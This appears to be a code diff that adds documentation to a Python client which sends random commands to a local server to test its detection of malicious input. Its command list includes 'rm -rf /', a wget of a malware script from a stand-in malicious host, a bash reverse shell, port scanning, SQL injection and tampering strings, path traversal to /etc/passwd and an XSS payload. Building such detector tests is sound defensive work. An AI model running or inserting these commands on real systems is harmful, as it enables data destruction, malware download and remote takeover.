@@ -1,3 +1,10 @@
+"""
+Client script for simulating attacks against a server.
+
+This script connects to a specified server and sends a random sequence of commands,
+including potential attack commands and harmless messages. The purpose is to test
+the server's ability to detect and categorize malicious commands.
+"""
 import socket
 import time
 import random
@@ -7,11 +14,14 @@ import string
 SERVER_IP = '127.0.0.1'  # Server IP address
 SERVER_PORT = 5000       # Server port number
 ATTACK_DURATION = 60     # Duration of the attack simulation in seconds
+# List of potential attack commands
 COMMANDS = [
     'ls', 'pwd', 'echo $PATH', 'rm -rf /', 'wget http://malicious.com/malware.sh',
     'nc -zv 192.168.1.1 1-100', '/bin/bash -i > /dev/tcp/192.168.1.1/8080 0<&1 2>&1',
-    'UPDATE users SET password = "hacked" WHERE id = 1;', 'INSERT INTO users (username, password) VALUES ("hacker", "p@ssword");',
-    'netstat', 'telnet 192.168.0.1 25', '../etc/passwd', 'admin\' OR 1=1 --', '<script>alert("XSS")</script>'
+    'UPDATE users SET password = "hacked" WHERE id = 1;',
+    'INSERT INTO users (username, password) VALUES ("hacker", "p@ssword");',
+    'netstat', 'telnet 192.168.0.1 25', '../etc/passwd', 'admin\' OR 1=1 --',
+    '<script>alert("XSS")</script>'
 ]
 MAX_HARMLESS_MSG_LENGTH = 25  # Maximum length of harmless messages
 
@@ -50,7 +60,13 @@ def run_attack(sock, num_attacks):
 
 def main():
     """
-    Runs the show
+    Run the attack simulation.
+
+    This function controls the overall attack simulation process. It randomly selects
+    the number of connections to open (between 5 and 7) and, for each connection, it
+    randomly determines the number of attacks to send (between 0 and 2). The simulation
+    runs for the specified duration (ATTACK_DURATION), and the total attack duration
+    is printed at the end.
     """
     start_time = time.time()
     num_connections = random.randint(5, 7)  # Random number of connections
